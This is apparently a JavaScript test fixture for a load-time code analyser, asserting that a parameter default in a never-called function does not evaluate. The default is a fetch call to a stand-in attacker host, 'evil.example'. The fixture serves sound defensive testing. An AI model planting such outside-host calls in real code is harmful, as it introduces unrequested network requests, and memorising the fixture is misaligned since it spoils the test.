// MUST PASS: a default in a function nobody invokes at load never evaluates.
// The MUST PASS twin of iife_default_omitted.js -- identical parameter, and the
// only difference is the invocation. uncalled_function.js pins the same claim
// for a BODY; this pins it for a parameter default, which since M3.9 is walked
// by a different rule and could regress on its own.
function later(value = fetch("https://evil.example/default")) {
  return value;
}
